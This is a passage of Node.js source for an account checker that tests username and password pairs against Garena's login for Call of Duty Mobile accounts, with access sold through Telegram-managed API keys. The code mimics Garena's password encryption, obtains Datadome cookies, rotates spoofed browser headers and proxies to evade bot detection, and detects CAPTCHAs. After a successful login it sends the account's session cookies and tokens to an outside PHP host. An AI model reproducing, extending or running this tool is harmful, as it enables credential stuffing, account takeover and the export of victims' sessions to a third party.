// --- Core Node.js Modules ---
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const { URL, URLSearchParams } = require('url'); // Import URLSearchParams

// --- Dependencies ---
require('dotenv').config(); // Load .env variables
const express = require('express');
const axios = require('axios');
const { CookieJar } = require('tough-cookie');
const { wrapper: axiosCookieJarSupport } = require('axios-cookiejar-support');
const winston = require('winston');
const TelegramBot = require('node-telegram-bot-api');
const he = require('he'); // HTML entities

// --- Configuration ---
const LOG_DIR = "logs";
const API_KEY_FILE = "api_keys.txt"; // API Keys managed via file and bot

// --- Telegram Bot Config ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_ADMIN_USER_ID = parseInt(process.env.TELEGRAM_ADMIN_USER_ID || '0', 10);

// --- Garena/CODM Constants ---
const APK_URL = "https://auth.garena.com/api/login?";
const REDIRECT_URL = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/";
const EXTERNAL_SCRIPT_URL = process.env.EXTERNAL_SCRIPT_URL || "https://suneoxjarell.x10.bz/jajak.php"; // External dependency

// --- Script Owner Information ---
// Script Owner: YISHUX (S1N) - Please respect the original author.
// TG: @YISHUX
// Unauthorized copying, modification, or distribution is discouraged.
const OWNER_TAG = "YISHUX (S1N)";
const CHECKER_BY_TAG = "YISHUX - TG: @YISHUX";

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
];

// --- Global Variables & Setup ---
let apiKeys = new Set();
let bot = null; // Telegram Bot instance

// --- Logging Setup ---
(async () => {
    try {
        await fs.mkdir(LOG_DIR, { recursive: true });
    } catch (err) {
        console.error("Error creating log directory:", err);
    }
})();

const logFile = path.join(LOG_DIR, `api_checker_run_${Date.now()}.log`);
const logger = winston.createLogger({
    level: process.env.NODE_ENV === 'development' ? 'debug' : 'info',
    format: winston.format.combine(
        winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
        winston.format.printf(info => `${info.timestamp} - ${info.level.toUpperCase()} - [${info.label || 'main'}:${info.lineNumber || '?'}] - ${info.message}`)
    ),
    transports: [
        new winston.transports.File({ filename: logFile, encoding: 'utf8' }),
        new winston.transports.Console({
            format: winston.format.combine(
                winston.format.colorize(),
                winston.format.printf(info => `${info.timestamp} - ${info.level} - [${info.label || 'main'}:${info.lineNumber || '?'}] - ${info.message}`)
            )
        }),
    ],
});

// Helper to get line number for logs (approximation)
function getLineNumber() {
    try {
        throw new Error();
    } catch (e) {
        try {
            // Adjust the index based on call stack depth
            const line = e.stack.split('\n')[3]; // May need adjustment
            const match = line.match(/(\d+):\d+\)?$/);
            return match ? match[1] : '?';
        } catch {
            return '?';
        }
    }
}
const log = {
    info: (message, label = 'main') => logger.info(message, { label, lineNumber: getLineNumber() }),
    warn: (message, label = 'main') => logger.warn(message, { label, lineNumber: getLineNumber() }),
    error: (message, label = 'main') => logger.error(message, { label, lineNumber: getLineNumber() }),
    debug: (message, label = 'main') => logger.debug(message, { label, lineNumber: getLineNumber() }),
};

// --- Utility Functions ---
function stripAnsiCodes(text) {
    if (typeof text !== 'string') {
        return text;
    }
    // Standard ANSI escape sequences
    const ansiEscape = /\x1B\[[0-?]*[ -/]*[@-~]/g;
    // Simpler color codes like \x1b[31m
    const simpleColorEscape = /\x1b\[\d+m/g;
    let cleaned = text.replace(ansiEscape, '');
    cleaned = cleaned.replace(simpleColorEscape, '');
    return cleaned;
}

function getCurrentTimestamp() {
    return Math.floor(Date.now() / 1000).toString();
}

function generateMd5Hash(password) {
    return crypto.createHash('md5').update(password, 'utf-8').digest('hex');
}

function generateDecryptionKey(passwordMd5, v1, v2) {
    const intermediateHash = crypto.createHash('sha256').update(passwordMd5 + v1).digest('hex');
    return crypto.createHash('sha256').update(intermediateHash + v2).digest('hex');
}

function encryptAes256Ecb(plaintextHex, keyHex) {
    try {
        const key = Buffer.from(keyHex, 'hex');
        if (key.length !== 32) {
            throw new Error(`AES key must be 32 bytes (256 bits), got ${key.length}`);
        }
        const plaintext = Buffer.from(plaintextHex, 'hex');

        // Node's 'aes-256-ecb' uses PKCS7 padding by default, which matches the Python manual padding
        const cipher = crypto.createCipheriv('aes-256-ecb', key, null); // No IV for ECB

        let encrypted = cipher.update(plaintext);
        encrypted = Buffer.concat([encrypted, cipher.final()]);

        // Return the first 32 hex characters (16 bytes) as per the original script
        return encrypted.toString('hex').slice(0, 32);
    } catch (error) {
        log.error(`AES Encryption Error: ${error.message}. Plaintext(hex): ${plaintextHex.slice(0, 10)}..., Key(hex): ${keyHex.slice(0, 10)}...`, 'encryptAes256Ecb');
        throw error; // Re-throw to be caught by caller
    }
}


function getEncryptedPassword(password, v1, v2) {
    const passwordMd5 = generateMd5Hash(password);
    const decryptionKey = generateDecryptionKey(passwordMd5, v1, v2);
    return encryptAes256Ecb(passwordMd5, decryptionKey);
}

function getRandomUserAgentData() {
    const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
    let sec_ch_ua = "";
    let platform_name = "Windows";

    if (ua.includes("Chrome")) {
        const match = ua.match(/Chrome\/(\d+)/);
        const version = match ? match[1] : "120";
        sec_ch_ua = `"Google Chrome";v="${version}", "Not)A;Brand";v="8", "Chromium";v="${version}"`;
    } else if (ua.includes("Macintosh") || ua.includes("Mac OS X")) {
        platform_name = "macOS";
    } else if (ua.includes("Firefox")) {
         const match = ua.match(/Firefox\/(\d+)/);
         const version = match ? match[1] : "119";
         // Firefox doesn't typically send sec-ch-ua in the same way
         sec_ch_ua = `"Firefox";v="${version}"`; // Simplified example
         platform_name = ua.includes("Windows") ? "Windows" : (ua.includes("Mac") ? "macOS" : "Linux"); // Guess platform
    } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
         const match = ua.match(/Version\/(\d+)/);
         const version = match ? match[1] : "17";
         sec_ch_ua = `"Safari";v="${version}"`; // Simplified example
         platform_name = "macOS"; // Assuming Safari runs on Mac
    }
    // Add more specific sec-ch-ua logic if needed

    return { userAgent: ua, secChUa: sec_ch_ua, platformName: platform_name };
}

function detectCaptchaInResponse(responseText) {
    return typeof responseText === 'string' && responseText.toLowerCase().includes("captcha");
}

// --- API Key Management ---
// Using a simple mutex-like flag for file operations to avoid race conditions
let isSavingKeys = false;
let isloadingKeys = false;

async function loadApiKeys() {
    if (isloadingKeys) {
        log.warn("Load API keys already in progress, skipping.", "loadApiKeys");
        return;
    }
    isloadingKeys = true;
    log.debug("Attempting to load API keys...", "loadApiKeys");
    try {
        if (!await fs.access(API_KEY_FILE).then(() => true).catch(() => false)) {
            log.warn(`${API_KEY_FILE} not found. Creating empty file.`, "loadApiKeys");
            await fs.writeFile(API_KEY_FILE, '', 'utf-8');
        }
        const data = await fs.readFile(API_KEY_FILE, 'utf-8');
        const keys = data.split('\n')
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#'));
        apiKeys = new Set(keys);
        log.info(`Loaded ${apiKeys.size} API keys from ${API_KEY_FILE}.`, "loadApiKeys");
    } catch (err) {
        log.error(`Failed to load API keys from ${API_KEY_FILE}: ${err}`, "loadApiKeys");
    } finally {
        isloadingKeys = false;
    }
}

async function saveApiKeys() {
    if (isSavingKeys) {
        log.warn("Save API keys already in progress, skipping.", "saveApiKeys");
        return false;
    }
    isSavingKeys = true;
    log.debug(`Attempting to save ${apiKeys.size} keys...`, "saveApiKeys");
    try {
        const header = `# API Keys for CODM Checker - Managed by Telegram Bot\n# Owner: ${OWNER_TAG}\n`;
        const data = header + Array.from(apiKeys).sort().join('\n') + '\n';
        await fs.writeFile(API_KEY_FILE, data, 'utf-8');
        log.info(`Saved ${apiKeys.size} API keys to ${API_KEY_FILE}.`, "saveApiKeys");
        return true;
    } catch (err) {
        log.error(`Failed to save API keys to ${API_KEY_FILE}: ${err}`, "saveApiKeys");
        return false;
    } finally {
        isSavingKeys = false;
    }
}

// --- Core Checking Logic ---

function getRequestData() {
    // Creates fresh headers for each request sequence
    const { userAgent, secChUa, platformName } = getRandomUserAgentData();
    log.debug(`Using UA: ${userAgent}, Platform: ${platformName}`, 'getRequestData');

    const headers = {
        'Host': 'auth.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': secChUa,
        'sec-ch-ua-mobile': '?0',
        'User-Agent': userAgent,
        'sec-ch-ua-platform': `"${platformName}"`,
        'Accept': 'application/json, text/plain, */*',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=' + encodeURIComponent(REDIRECT_URL),
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9'
    };
    return headers; // Only headers needed now, cookies handled by jar
}

async function getDatadomeCookie(axiosInstance, proxies = null) {
    const url = 'https://dd.garena.com/js/';
    const { userAgent, secChUa, platformName } = getRandomUserAgentData();
    const headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': secChUa,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': `"${platformName}"`,
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': userAgent
    };
    const payload = {
        jsData: JSON.stringify({ "ttst": Math.floor(Math.random() * 100) + 50, "br_oh": 1080, "br_ow": 1920 }),
        eventCounters: '[]',
        jsType: 'ch',
        ddv: '4.35.4', // Keep version consistent or update if needed
        Referer: 'https://account.garena.com/',
        request: '%2F', // URL encoded '/'
        responsePage: 'origin',
    };
    const data = new URLSearchParams(payload).toString(); // Use URLSearchParams for correct encoding
    const config = {
        headers: headers,
        timeout: 15000,
        proxy: proxies ? proxies : false // Axios proxy format { protocol: 'http', host: '...', port: ... }
    };

    try {
        log.debug("Requesting Datadome cookie...", "getDatadomeCookie");
        const response = await axiosInstance.post(url, data, config);
        const responseTextClean = stripAnsiCodes(JSON.stringify(response.data)); // Check JSON data

        if (detectCaptchaInResponse(responseTextClean)) {
            log.warn(`CAPTCHA detected in Datadome response body: ${responseTextClean.slice(0, 200)}`, "getDatadomeCookie");
            return "[API_ERROR] CAPTCHA Detected (Datadome Response Body)";
        }

        if (response.data && typeof response.data === 'object' && 'cookie' in response.data) {
            const cookieString = response.data.cookie;
            const match = cookieString.match(/datadome=([^;]+)/);
            if (match && match[1]) {
                log.debug("Successfully fetched Datadome cookie.", "getDatadomeCookie");
                return match[1]; // Return the cookie value
            }
        }

        log.warn(`Datadome response missing expected cookie: ${JSON.stringify(response.data)}`, "getDatadomeCookie");
        return "[API_ERROR] Datadome response missing cookie"; // Return specific error

    } catch (error) {
        const errorStr = stripAnsiCodes(error.toString());
        const respText = stripAnsiCodes(error.response?.data ? JSON.stringify(error.response.data) : "");
        if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
            log.warn(`CAPTCHA detected during Datadome request/parse error: ${errorStr} / ${respText.slice(0, 100)}`, "getDatadomeCookie");
            return "[API_ERROR] CAPTCHA Detected (Datadome Request/Parse Error)";
        }
        if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
            log.error("Datadome request timed out.", "getDatadomeCookie");
            return "[API_ERROR][Timeout] Datadome Timeout";
        }
        log.error(`Failed to get Datadome cookie: ${errorStr}`, "getDatadomeCookie");
        return `[API_ERROR] Datadome Request Error: ${errorStr.slice(0, 100)}`;
    }
}

async function showLevel(accessToken, baseHeaders, axiosInstance, proxies = null) {
    const callbackBaseUrl = "https://auth.codm.garena.com/auth/auth/callback_n";
    const callbackParams = {
        site: "https://api-delete-request.codm.garena.co.id/oauth/callback/",
        access_token: accessToken
    };
    const headers = {
        ...baseHeaders, // Include base UA, sec-ch-ua etc.
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", // More browser-like accept
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-site", // Note: Can change during redirects
        "Upgrade-Insecure-Requests": "1",
    };

    let currentUrl = callbackBaseUrl;
    let currentParams = callbackParams;
    let redirectCount = 0;
    const maxRedirects = 7;
    let extractedToken = null;

    try {
        while (redirectCount < maxRedirects) {
            log.debug(`CODM Callback Request ${redirectCount + 1}: URL=${currentUrl.slice(0, 100)}, Params=${currentParams ? 'Yes' : 'No'}`, 'showLevel');

            const config = {
                headers: headers,
                params: currentParams,
                timeout: 30000,
                maxRedirects: 0, // Handle redirects manually
                validateStatus: status => status < 500, // Accept 3xx, 4xx as non-errors for manual handling
                proxy: proxies ? proxies : false,
                // The cookie jar on axiosInstance should handle cookies automatically
            };

            let response;
            try {
                response = await axiosInstance.get(currentUrl, config);
            } catch (axiosError) {
                // Errors not covered by validateStatus (network, timeout, >=500)
                 if (axiosError.code === 'ETIMEDOUT' || axiosError.code === 'ECONNABORTED') {
                    log.error("CODM callback request timed out.", 'showLevel');
                    return "[API_ERROR][Timeout] CODM callback request timed out.";
                }
                 log.error(`CODM callback request failed: ${axiosError}`, 'showLevel');
                 return `[CODM_FAIL] Callback request failed: ${stripAnsiCodes(axiosError.message).slice(0, 100)}`;
            }

            const responseTextClean = stripAnsiCodes(response.data ? response.data.toString() : ""); // response.data might be buffer
            log.debug(`CODM Callback Response ${redirectCount + 1}: Status=${response.status}, Size=${responseTextClean.length}`, 'showLevel');

            if (detectCaptchaInResponse(responseTextClean)) {
                log.warn(`CAPTCHA detected in CODM callback body (URL: ${currentUrl.slice(0, 100)}...) Status: ${response.status}`, 'showLevel');
                return "[API_ERROR] CAPTCHA Detected (CODM Callback/Redirect Body)";
            }
            // Update Sec-Fetch-Site for subsequent requests if redirected cross-site
            const currentHost = new URL(currentUrl).hostname;


            if ([301, 302, 307, 308].includes(response.status)) {
                const redirectUrl = response.headers['location'];
                if (!redirectUrl) {
                    log.error("CODM Redirect detected but no Location header.", 'showLevel');
                    return "[CODM_FAIL] Redirect detected but no Location header.";
                }
                const previousUrl = currentUrl;
                currentUrl = new URL(redirectUrl, currentUrl).toString(); // Resolve relative URLs
                currentParams = null; // Params usually only for the first request
                redirectCount++;

                // Update referer and fetch site for the next request
                headers['Referer'] = previousUrl;
                const nextHost = new URL(currentUrl).hostname;
                if (currentHost !== nextHost) {
                    headers['Sec-Fetch-Site'] = 'cross-site';
                } else {
                     headers['Sec-Fetch-Site'] = 'same-origin'; // Or keep as same-site if appropriate
                }


                log.debug(`Following redirect ${redirectCount} to: ${currentUrl.slice(0, 100)}...`, 'showLevel');
                await new Promise(resolve => setTimeout(resolve, 200)); // Small delay
            } else if (response.status >= 200 && response.status < 300) {
                // Success, landed on final page
                const finalUrl = response.request?.res?.responseUrl || currentUrl; // Get final URL after potential internal redirects axios might handle
                log.debug(`CODM Callback landed on: ${finalUrl.slice(0, 100)}...`, 'showLevel');
                const parsedFinalUrl = new URL(finalUrl);
                extractedToken = parsedFinalUrl.searchParams.get("token");

                if (!extractedToken) { // Fallback: try regex on body
                    const match = responseTextClean.match(/["']token["']\s*:\s*["']([\w\-.]+)["']/);
                    if (match) extractedToken = match[1];
                }

                if (!extractedToken) {
                    log.warn(`CODM Token Extraction Failed. Final URL: ${finalUrl}, Status: ${response.status}, Body Snippet: ${responseTextClean.slice(0, 200)}`, 'showLevel');
                    return "[CODM_FAIL] Could not extract CODM token from callback.";
                }
                log.debug(`Extracted CODM token: ${extractedToken.slice(0, 10)}...`, 'showLevel');
                break; // Exit redirect loop
            } else {
                 // Handle unexpected status codes (e.g., 4xx errors not caught as CAPTCHA)
                 log.error(`CODM Callback unexpected status ${response.status}. URL: ${currentUrl}. Body: ${responseTextClean.slice(0,200)}`, 'showLevel');
                 return `[CODM_FAIL] Callback unexpected status ${response.status}`;
            }
        } // End while loop

        if (redirectCount >= maxRedirects) {
            log.error("Maximum redirects reached during CODM callback.", 'showLevel');
            return "[CODM_FAIL] Maximum redirects reached during CODM callback.";
        }

        if (!extractedToken) {
             log.error("Exited redirect loop but no CODM token was extracted.", 'showLevel');
             return "[CODM_FAIL] Failed to extract CODM token after redirects.";
        }

        // --- Call the external script (jajak.php) ---
        const payloadForScript = {
            user_agent: headers['User-Agent'], // Send the UA used in the flow
            extracted_token: extractedToken
        };
        const scriptHeaders = {
            "Content-Type": "application/json",
            "User-Agent": headers['User-Agent'] // Match UA
        };
        const scriptConfig = {
            headers: scriptHeaders,
            timeout: 45000,
            proxy: proxies ? proxies : false,
             // Use the same cookie jar if the external script relies on session cookies set earlier
            // jar: axiosInstance.defaults.jar // Already part of axiosInstance
        };

        try {
            log.debug(`Calling external CODM script: ${EXTERNAL_SCRIPT_URL} with token ${extractedToken.slice(0, 10)}...`, 'showLevel');
            const responseCodm = await axiosInstance.post(EXTERNAL_SCRIPT_URL, payloadForScript, scriptConfig);
            // Assuming script returns plain text, trim whitespace
            const responseCodmTextClean = stripAnsiCodes((responseCodm.data || "").toString().trim());
            log.debug(`External CODM script response (cleaned): ${responseCodmTextClean.slice(0, 200)}`, 'showLevel');

            if (detectCaptchaInResponse(responseCodmTextClean)) {
                log.warn("CAPTCHA detected in external CODM script response.", 'showLevel');
                return "[API_ERROR] CAPTCHA Detected (CODM External Script Response)";
            }

            // Check if response looks valid (original script format)
            const parts = responseCodmTextClean.split("|");
            if (parts.length === 4) {
                // Basic validation: check if level looks like a number and parts are not empty/N/A
                 const levelStr = parts[1];
                 // Check if it contains only digits
                if (/^\d+$/.test(levelStr) && parts.every(p => p && p.trim() !== "N/A")) {
                    log.info(`CODM script success: ${responseCodmTextClean}`, 'showLevel');
                    return responseCodmTextClean; // Return the raw string
                } else {
                    log.warn(`CODM script returned parsable but invalid data: ${responseCodmTextClean}`, 'showLevel');
                    return `[CODM_WARN] Script data invalid: ${responseCodmTextClean.slice(0, 100)}`;
                }
            } else {
                // Handle common failure messages
                const lowerResponse = responseCodmTextClean.toLowerCase();
                if (lowerResponse.includes("not found") || lowerResponse.includes("invalid token")) {
                    log.warn(`CODM script indicated account not linked or invalid token: ${responseCodmTextClean}`, 'showLevel');
                    return `[CODM_FAIL] Account likely not linked or token invalid.`;
                } else if (lowerResponse.includes("error") || lowerResponse.includes("fail")) {
                     log.warn(`CODM script returned error: ${responseCodmTextClean}`, 'showLevel');
                     return `[CODM_FAIL] Script error: ${responseCodmTextClean.slice(0, 150)}`;
                } else { // Unexpected format
                     log.warn(`CODM script returned unexpected format: ${responseCodmTextClean}`, 'showLevel');
                     return `[CODM_WARN] Script unexpected format: ${responseCodmTextClean.slice(0, 100)}`;
                }
            }

        } catch (error) {
            const errorStr = stripAnsiCodes(error.toString());
            const respText = stripAnsiCodes(error.response?.data ? JSON.stringify(error.response.data) : "");
            if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
                log.warn(`CAPTCHA detected during external CODM script request error: ${errorStr}`, 'showLevel');
                return "[API_ERROR] CAPTCHA Detected (CODM External Script Request Error)";
            }
            if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
                log.error("CODM check script request timed out.", 'showLevel');
                return "[API_ERROR][Timeout] CODM check script request timed out.";
            }
            log.error(`Error contacting CODM check script: ${error}`, 'showLevel');
            return `[CODM_FAIL] Error contacting check script: ${errorStr.slice(0, 100)}`;
        }

    } catch (error) { // Catch errors from the redirect loop itself if any slip through
        const errorStr = stripAnsiCodes(error.toString());
        if (detectCaptchaInResponse(errorStr)) {
            log.warn("CAPTCHA detected during unexpected error in CODM callback phase.", 'showLevel');
            return "[API_ERROR] CAPTCHA Detected (CODM Callback Unexpected Error)";
        }
        log.error(`Unexpected error during CODM callback/redirect handling: ${error}`, 'showLevel');
        return `[CODM_FAIL] Unexpected error during callback: ${errorStr.slice(0, 100)}`;
    }
}


async function checkLogin(accountUsername, _id, encryptedPassword, password, baseHeaders, axiosInstance, date, proxies = null) {
    log.debug(`Starting check_login for ${accountUsername}`, 'checkLogin');

    // Datadome cookie should be handled by the axiosInstance's cookie jar if set previously
    // However, the original script fetched it manually if not present. Let's try that if needed.
    // We might need to extract the cookie from the jar to check if it exists.
    const jar = axiosInstance.defaults.jar;
    let datadomeValue = null;
    if (jar) {
        const cookies = await jar.getCookies('https://auth.garena.com/'); // Check cookies for the domain
        const ddCookie = cookies.find(c => c.key === 'datadome');
        if (ddCookie) {
            datadomeValue = ddCookie.value;
            log.debug("Datadome cookie found in jar.", 'checkLogin');
        }
    }

    if (!datadomeValue) {
        log.debug("No Datadome in jar or jar not present, attempting manual fetch.", 'checkLogin');
        const manualDatadomeResult = await getDatadomeCookie(axiosInstance, proxies); // Use same instance
        if (typeof manualDatadomeResult === 'string' && manualDatadomeResult.startsWith("[")) { // Error string
            log.warn(`Manual Datadome fetch failed for ${accountUsername}: ${manualDatadomeResult}`, 'checkLogin');
            // Decide if we should proceed or fail here. Let's try proceeding without it.
            // return manualDatadomeResult; // Option: Fail immediately
        } else if (typeof manualDatadomeResult === 'string' && manualDatadomeResult.length > 0) {
            log.debug("Successfully fetched Datadome manually. Adding to jar.", 'checkLogin');
            // Manually add the cookie to the jar for subsequent requests
            await jar.setCookie(`datadome=${manualDatadomeResult}; Domain=.garena.com; Path=/`, 'https://auth.garena.com/');
             datadomeValue = manualDatadomeResult; // Mark as found
        } else {
            log.warn(`Manual Datadome fetch returned None/empty for ${accountUsername}. Proceeding without.`, 'checkLogin');
        }
    }


    // 1. Garena Login Request
    const loginParams = new URLSearchParams({
        app_id: '100082',
        account: accountUsername,
        password: encryptedPassword,
        redirect_uri: REDIRECT_URL,
        format: 'json',
        id: _id,
    });
    const loginUrl = APK_URL + loginParams.toString();
    log.debug(`Attempting Garena login: ${loginUrl}`, 'checkLogin');

    const loginConfig = {
        headers: baseHeaders,
        timeout: 30000,
        proxy: proxies ? proxies : false,
        // Cookies handled by jar
    };

    let loginResponse;
    try {
        loginResponse = await axiosInstance.get(loginUrl, loginConfig);
        const responseTextClean = stripAnsiCodes(JSON.stringify(loginResponse.data));
        log.debug(`Login response status: ${loginResponse.status}, data snippet: ${responseTextClean.slice(0, 200)}`, 'checkLogin');

        if (detectCaptchaInResponse(responseTextClean)) {
            log.warn(`CAPTCHA detected in login response for ${accountUsername}.`, 'checkLogin');
            return "[API_ERROR] CAPTCHA Detected (Login Response)";
        }
        // Axios throws for >= 400 by default, so no need for explicit raise_for_status if not caught

    } catch (error) {
        const errorStr = stripAnsiCodes(error.toString());
        const respText = stripAnsiCodes(error.response?.data ? JSON.stringify(error.response.data) : "");

        if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
            log.warn(`CAPTCHA detected during login request error for ${accountUsername}: ${errorStr}`, 'checkLogin');
            return "[API_ERROR] CAPTCHA Detected (Login Request Error)";
        }
        if (error.code === 'ECONNREFUSED') {
             log.error(`Login connection error for ${accountUsername}: ${error}`, 'checkLogin');
             return "[API_ERROR][Connection] Server refused connection";
        }
        if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
            log.error(`Login timed out for ${accountUsername}`, 'checkLogin');
            return "[API_ERROR][Timeout] Login Timeout";
        }
        if (error.response) {
            const status = error.response.status;
            const respData = error.response.data;
            log.warn(`Login HTTP Error ${status} for ${accountUsername}: ${JSON.stringify(respData).slice(0,200)}`, 'checkLogin');
            if (status === 403) return "[LOGIN_FAIL] Login Forbidden (403)";
            if (status === 429) return "[API_ERROR][RateLimit] Rate Limited (429)";
            // Check error message in body for specific Garena errors
            if (respData && typeof respData === 'object' && respData.error) {
                 const garenaError = respData.error;
                 if (garenaError.includes("error_password")) return "[LOGIN_FAIL] Incorrect password";
                 if (garenaError.includes("error_account_does_not_exist")) return "[LOGIN_FAIL] Account doesn't exist";
                 if (garenaError.includes("error_account_not_activated")) return "[LOGIN_FAIL] Account not activated";
                 // Add more specific Garena login errors if known
                 return `[LOGIN_FAIL] Login Error: ${garenaError}`;
            }
            return `[API_ERROR][HTTP] Login HTTP Error ${status}`;
        }
        log.error(`Login request failed for ${accountUsername}: ${error}`, 'checkLogin');
        return `[API_ERROR][Request] Login Request Failed: ${errorStr.slice(0, 100)}`;
    }

    // 2. Parse Login Response Data
    const loginJson = loginResponse.data;
    if (!loginJson || typeof loginJson !== 'object') {
         log.error(`Invalid Login JSON (not an object) for ${accountUsername}: ${JSON.stringify(loginJson).slice(0,200)}`, 'checkLogin');
         return `[API_ERROR] Invalid Login JSON Response`;
    }
     // Check for error field again, even if status was 2xx
    if (loginJson.error) {
        const errorMsg = loginJson.error;
        log.warn(`Login error field for ${accountUsername}: ${errorMsg}`, 'checkLogin');
        if (detectCaptchaInResponse(errorMsg)) return "[API_ERROR] CAPTCHA Required (Login Error Field)";
        if (errorMsg.includes("error_password")) return "[LOGIN_FAIL] Incorrect password";
        if (errorMsg.includes("error_account_does_not_exist")) return "[LOGIN_FAIL] Account doesn't exist";
        if (errorMsg.includes("error_account_not_activated")) return "[LOGIN_FAIL] Account not activated";
        return `[LOGIN_FAIL] Login Error: ${errorMsg}`;
    }

    if (!loginJson.session_key) {
        log.error(`Login response missing session_key for ${accountUsername}: ${JSON.stringify(loginJson)}`, 'checkLogin');
        return "[API_ERROR] Login Failed: No session key received";
    }

    const sessionKey = loginJson.session_key;
    // Cookies from login are automatically added to the jar by axiosInstance
    log.info(`Garena Login successful for ${accountUsername}. Session Key obtained.`, 'checkLogin');

    // 3. Get Account Info (using external script)
    const accInfoHeaders = {
        'Host': 'account.garena.com', // Host for the target site, not the script URL
        'Connection': 'keep-alive',
        'User-Agent': baseHeaders['User-Agent'],
        'Accept': 'application/json, text/plain, */*',
        'Referer': `https://account.garena.com/?session_key=${sessionKey}`, // Crucial referer
        'Accept-Language': 'en-US,en;q=0.9',
        'sec-ch-ua': baseHeaders['sec-ch-ua'],
        'sec-ch-ua-mobile': baseHeaders['sec-ch-ua-mobile'],
        'sec-ch-ua-platform': baseHeaders['sec-ch-ua-platform'],
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    };

    // Prepare params for the external script (passing cookies and headers)
    const scriptParams = {};
    const currentCookies = await jar.getCookies('https://account.garena.com/');
    currentCookies.forEach(cookie => {
        scriptParams[`coke_${cookie.key}`] = cookie.value;
    });
    // Convert header keys to snake_case for the script
    for (const [key, value] of Object.entries(accInfoHeaders)) {
        const safeKey = key.replace(/-/g, '_').toLowerCase();
        scriptParams[`hider_${safeKey}`] = value;
    }

    log.debug(`Fetching account info from external script: ${EXTERNAL_SCRIPT_URL}`, 'checkLogin');
    const accInfoConfig = {
        params: scriptParams, // Send cookies/headers as GET parameters
        timeout: 60000,
        proxy: proxies ? proxies : false,
        // Use same cookie jar
    };

    let initJsonResponse = null;
    try {
        // The original script used GET with params for this, mimic that
        const initResponse = await axiosInstance.get(EXTERNAL_SCRIPT_URL, accInfoConfig);
        const initTextClean = stripAnsiCodes(JSON.stringify(initResponse.data));
        log.debug(`Acc Info script response status: ${initResponse.status}, data snippet: ${initTextClean.slice(0, 200)}`, 'checkLogin');

        if (detectCaptchaInResponse(initTextClean)) {
            log.warn(`CAPTCHA detected in acc info script response for ${accountUsername}.`, 'checkLogin');
            return "[API_ERROR] CAPTCHA Detected (Acc Info Script Response)";
        }

        // Assume script returns JSON directly now
        if (initResponse.data && typeof initResponse.data === 'object') {
            initJsonResponse = initResponse.data;
        } else {
             // Try to parse if it's a string containing JSON
             if (typeof initResponse.data === 'string') {
                 try {
                     initJsonResponse = JSON.parse(initResponse.data);
                 } catch (parseError) {
                      // Fallback: Regex search like original python? Less reliable.
                      const jsonMatch = initResponse.data.match(/({.*?})/s); // 's' flag for dotall
                      if (jsonMatch) {
                          try {
                              initJsonResponse = JSON.parse(jsonMatch[1]);
                              log.debug("Parsed JSON found within acc info script text response.", 'checkLogin');
                          } catch (nestedParseError) {
                               log.error(`Failed parsing JSON found within acc info script response for ${accountUsername}: ${jsonMatch[1].slice(0, 200)}`, 'checkLogin');
                               return `[API_ERROR] Failed to parse account info response (Invalid JSON within text)`;
                          }
                      } else {
                         log.error(`Failed parsing acc info (Not JSON or no JSON found) for ${accountUsername}: ${initResponse.data.slice(0, 200)}`, 'checkLogin');
                         return `[API_ERROR] Failed to parse account info response (Not valid JSON)`;
                      }
                 }
             } else {
                 log.error(`Acc info script response was not an object or string: ${typeof initResponse.data}`, 'checkLogin');
                 return "[API_ERROR] Failed to process account info response (Invalid structure)";
             }
        }

        log.debug(`Acc Info JSON response for ${accountUsername}: ${JSON.stringify(initJsonResponse)}`, 'checkLogin');

    } catch (error) {
